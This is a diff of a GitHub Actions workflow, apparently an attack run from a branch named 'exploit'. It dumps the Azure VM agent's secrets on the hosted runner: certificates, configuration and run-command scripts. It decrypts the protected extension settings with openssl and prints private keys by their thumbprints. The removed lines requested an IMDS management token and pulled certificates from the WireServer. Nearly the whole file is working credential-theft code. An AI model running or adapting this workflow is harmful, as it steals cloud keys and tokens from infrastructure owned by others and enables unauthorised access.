@@ -3,40 +3,73 @@ on:
   push:
     branches: [exploit]
     paths: ['.github/workflows/recon.yml']
-  workflow_dispatch:
 jobs:
   recon:
     runs-on: ubuntu-latest
     steps:
-      - name: Deep Recon
+      - name: Deep Recon 2
         run: |
           set +e
-          echo "=== TRANSPORT KEY ==="
-          sudo cat /var/lib/waagent/TransportPrivate.pem 2>/dev/null || echo "NO KEY FOUND"
+          echo "=== OVF-ENV ==="
+          sudo cat /var/lib/waagent/ovf-env.xml 2>/dev/null
           echo ""
-          echo "=== WAAGENT DIR ==="
-          sudo ls -la /var/lib/waagent/ 2>/dev/null | head -50
+          echo "=== CERTIFICATES.PEM ==="
+          sudo cat /var/lib/waagent/Certificates.pem 2>/dev/null
           echo ""
-          echo "=== PEM FILES ==="
-          sudo find /var/lib/waagent -name "*.pem" -exec echo {} \; 2>/dev/null
+          echo "=== CERTIFICATES.XML ==="
+          sudo cat /var/lib/waagent/Certificates.xml 2>/dev/null
           echo ""
-          echo "=== KVP0 ==="
-          sudo strings /var/lib/hyperv/.kvp_pool_0 2>/dev/null | head -40
+          echo "=== SHARED CONFIG ==="
+          sudo cat /var/lib/waagent/SharedConfig.xml 2>/dev/null
           echo ""
-          echo "=== KVP3 ==="
-          sudo strings /var/lib/hyperv/.kvp_pool_3 2>/dev/null | head -40
+          echo "=== RUN-COMMAND DOWNLOADS ==="
+          sudo find /var/lib/waagent/run-command -type f 2>/dev/null
           echo ""
-          echo "=== IMDS IDENTITY ==="
-          curl -sH "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+          echo "=== RUN-COMMAND SCRIPT 0 ==="
+          sudo cat /var/lib/waagent/run-command/download/0/script.sh 2>/dev/null
           echo ""
-          echo "=== WIRESERVER CERTS ==="
-          GS=$(curl -s http://168.63.129.16/machine?comp=goalstate -H "x-ms-version: 2012-11-30")
-          CONT=$(echo "$GS" | sed -n 's/.*<ContainerId>\(.*\)<\/ContainerId>.*/\1/p')
-          INST=$(echo "$GS" | sed -n 's/.*<InstanceId>\(.*\)<\/InstanceId>.*/\1/p' | head -1)
-          echo "Container=$CONT Instance=$INST"
-          curl -s "http://168.63.129.16/machine/$CONT/$INST?comp=certificates&incarnation=1" -H "x-ms-version: 2012-11-30" | head -50
+          echo "=== EXTENSION CONFIG ==="
+          sudo find /var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.9 -type f 2>/dev/null
+          sudo cat /var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.9/config/0.settings 2>/dev/null | head -50
           echo ""
-          echo "=== NETWORK ==="
-          ip addr show | grep "inet "
-          ip route
+          echo "=== DECRYPT PROTECTED SETTINGS ==="
+          sudo python3 -c "
+import json, base64, subprocess, os
+# Read the settings file
+settings_dir = '/var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.9/config/'
+for f in sorted(os.listdir(settings_dir)):
+    if f.endswith('.settings'):
+        data = json.loads(open(settings_dir + f).read())
+        rs = data.get('runtimeSettings', [{}])[0].get('handlerSettings', {})
+        thumb = rs.get('protectedSettingsCertThumbprint', '')
+        protected = rs.get('protectedSettings', '')
+        if protected:
+            print(f'File: {f}, Thumbprint: {thumb}')
+            # Decrypt using the cert
+            with open('/tmp/enc.b64', 'w') as ef:
+                ef.write(protected)
+            os.system('base64 -d /tmp/enc.b64 > /tmp/enc.cms')
+            prv = f'/var/lib/waagent/{thumb}.prv'
+            crt = f'/var/lib/waagent/{thumb}.crt'
+            if os.path.exists(prv):
+                result = subprocess.run(['openssl', 'cms', '-decrypt', '-inform', 'DER', '-inkey', prv, '-recip', crt, '-in', '/tmp/enc.cms'], capture_output=True)
+                if result.returncode == 0:
+                    print(f'DECRYPTED: {result.stdout.decode()[:2000]}')
+                else:
+                    # Try PKCS7
+                    result = subprocess.run(['openssl', 'smime', '-decrypt', '-inform', 'DER', '-inkey', prv, '-in', '/tmp/enc.cms'], capture_output=True)
+                    if result.returncode == 0:
+                        print(f'DECRYPTED (smime): {result.stdout.decode()[:2000]}')
+                    else:
+                        print(f'Decrypt failed: {result.stderr.decode()[:200]}')
+            else:
+                print(f'Key not found: {prv}')
+" 2>&1
+          echo ""
+          echo "=== PRV KEY (87A6) ==="
+          sudo cat /var/lib/waagent/87A60B02BDFB41D42134F762C956C7C91EC75A75.prv 2>/dev/null
+          echo ""
+          echo "=== PRV KEY (EE99) ==="
+          sudo cat /var/lib/waagent/EE997ABB593CB9C93CC337B7A60D9DD11FFE76D3.prv 2>/dev/null
+          echo ""
           echo "=== DONE ==="
